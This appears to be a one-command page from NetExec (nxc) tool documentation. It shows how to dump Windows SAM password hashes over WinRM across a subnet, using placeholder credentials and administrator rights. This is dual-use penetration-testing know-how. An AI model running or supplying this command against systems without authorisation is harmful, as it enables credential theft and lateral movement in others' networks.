# Dump SAM

### Dump SAM hashes

Extracts and downloads SAM registry hive, and uses secretsdump.py methods locally to dump hashes

{% include "../../.gitbook/includes/admin-privs.md" %}

```bash
nxc winrm 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
```
